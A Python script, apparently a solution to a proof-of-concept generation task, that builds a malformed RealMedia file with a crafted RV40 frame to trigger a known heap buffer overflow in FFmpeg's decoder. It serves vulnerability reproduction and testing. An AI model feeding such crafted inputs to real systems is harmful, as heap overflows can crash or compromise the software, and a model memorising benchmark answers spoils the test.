import struct
import math

class Solution:
    """
    Generates a PoC for a heap buffer overflow in FFmpeg's RV40 decoder.
    Vulnerability: oss-fuzz:385170375
    """

    class _BitstreamWriter:
        """A helper class to write bitstreams."""
        def __init__(self):
            self.bits = ""

        def write(self, value: int, num_bits: int):
            """Writes bits in big-endian order."""
            if num_bits > 0:
                self.bits += format(value, '0' + str(num_bits) + 'b')

        def write_le(self, value: int, num_bits: int):
            """Writes bits in little-endian order (per bit)."""
            le_bits = ""
            for i in range(num_bits):
                le_bits += str((value >> i) & 1)
            self.bits += le_bits

        def get_bytes(self) -> bytes:
            """Returns the bitstream as a byte string, padded with zeros."""
            # Pad with zeros to make it byte-aligned
            if len(self.bits) % 8 != 0:
                self.bits += '0' * (8 - (len(self.bits) % 8))
            
            byte_array = bytearray()
            for i in range(0, len(self.bits), 8):
                byte = self.bits[i:i+8]
                byte_array.append(int(byte, 2))
            return bytes(byte_array)

    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input that triggers the vulnerability.

        The vulnerability exists in the rv34/rv40 decoder when parsing video frame
        slices. The GetBitContext for a slice is incorrectly initialized with a size
        derived from the total packet size, rather than the actual slice size.
        This allows reading beyond the allocated buffer for the slice.

        To trigger this, we construct a RealMedia (.rm) file containing a single
        RV40 video frame. This frame is crafted to have two slices, where the
        first slice is very small (1 byte), but the overall packet is larger.
        When the decoder processes the first slice, it attempts to read more data
        than is available for that slice, causing a heap buffer overflow.

        The PoC is constructed as follows:
        1. A malicious video packet payload is created. It contains a picture header
           that specifies multiple slices and a very small size for the first slice.
        2. A minimal but valid RV40 extradata (sequence header) is generated, as
           it's required by the decoder for initialization.
        3. These are wrapped in a minimal RealMedia (.rm) container to be a valid
           input file for tools like ffmpeg. The RM container is stripped of
           optional parts to minimize size.
        """
        
        # 1. Craft the malicious video packet payload.
        # The packet size is minimized to create a smaller PoC.
        packet_payload_size = 6
        # The number of bits for slice offsets depends on the packet size.
        slice_bits = packet_payload_size.bit_length()

        bs = self._BitstreamWriter()
        
        # Picture Header for an I-frame
        bs.write(0, 2)    # ptype = I-frame
        bs.write(10, 5)   # pquant
        bs.write(0, 13)   # tr (temporal reference)
        bs.write(1, 1)    # slice_combine_flag = 1 (slice info is in the stream)
        
        # Number of slices: 2 (encoded as num_slices - 1)
        bs.write(1, 9)
        
        # Pad to the next byte boundary
        header_bits = 2 + 5 + 13 + 1 + 9
        padding_bits = (8 - (header_bits % 8)) % 8
        bs.write(0, padding_bits)
        
        # The crucial part: define slice offsets.
        # The header is 4 bytes long, so the first slice (slice 0) starts at offset 4.
        # We set the next slice's offset to be just 1 byte after, making slice 0
        # only 1 byte long. The value written (1) is the delta from the previous offset.
        bs.write_le(1, slice_bits)

        bitstream_part = bs.get_bytes()
        slice0_data = b'\xAA' # Arbitrary data for the tiny slice 0.
        
        payload = bitstream_part + slice0_data
        padding = b'\x00' * (packet_payload_size - len(payload))
        video_payload = payload + padding
        
        # 2. Craft the RV40 extradata (sequence header).
        bs_extra = self._BitstreamWriter()
        bs_extra.write(0x10002, 24) # Magic number for RV40 extradata
        bs_extra.write(0, 10) # pels (related to width)
        bs_extra.write(0, 10) # lines (related to height)
        bs_extra.write(0, 8)  # tr
        bs_extra.write(0, 2)  # ps_nr
        bs_extra.write(0, 4)  # ps_width
        bs_extra.write(0, 4)  # ps_height
        bs_extra.write(0, 2)  # profile_bits
        bs_extra.write(0, 8)  # num_slice_sizes_minus1
        bs_extra.write(0, 8)  # h->num_slices_minus1
        extradata_bytes = bs_extra.get_bytes()

        # RM containers are big-endian, so we need to pad and byte-swap the extradata.
        if len(extradata_bytes) % 4 != 0:
            extradata_bytes += b'\x00' * (4 - (len(extradata_bytes) % 4))
        swapped_extradata = b''
        for i in range(0, len(extradata_bytes), 4):
            swapped_extradata += extradata_bytes[i:i+4][::-1]

        # 3. Assemble the RealMedia (.rm) container file.
        packet = struct.pack('>HI', 0, 0) + b'\x00\x02' + video_payload

        # MDPR (Media Properties) Chunk Content
        type_specific = (
            b'VIDO' + b'RV40' +
            struct.pack('<HH', 16, 16) +
            b'\x00' * 8 +
            struct.pack('>I', len(swapped_extradata)) +
            swapped_extradata
        )
        mdpr_content = (
            struct.pack('>HH', 0, 0) +
            b'\x00' * 24 +
            b'\x00\x00' +
            struct.pack('>I', len(type_specific)) +
            type_specific
        )
        
        # PROP (Properties) Chunk Content (data_offset is patched later)
        prop_content_prefix = (
            struct.pack('>H', 0) +
            struct.pack('>II', 10000, 10000) +
            struct.pack('>II', len(packet), len(packet)) +
            struct.pack('>I', 1) +
            struct.pack('>II', 1000, 0) +
            struct.pack('>I', 0)
        )
        prop_content_suffix = struct.pack('>HH', 1, 0)

        # Calculate final chunk sizes and data offset
        rmf_header_size = 12
        prop_chunk_size = 10 + len(prop_content_prefix) + 4 + len(prop_content_suffix)
        mdpr_chunk_size = 10 + len(mdpr_content)
        data_offset = rmf_header_size + prop_chunk_size + mdpr_chunk_size

        prop_content = prop_content_prefix + struct.pack('>I', data_offset) + prop_content_suffix

        # Assemble the final PoC file
        # RMF Header (specifies 2 chunks: PROP and MDPR)
        poc = b'.RMF' + struct.pack('>II', 0, 2)
        
        # PROP Chunk
        poc += b'PROP' + struct.pack('>IH', prop_chunk_size, 0) + prop_content
        
        # MDPR Chunk
        poc += b'MDPR' + struct.pack('>IH', mdpr_chunk_size, 0) + mdpr_content
        
        # DATA (just the raw packet, no DATA chunk header to save space)
        poc += packet
        
        return poc
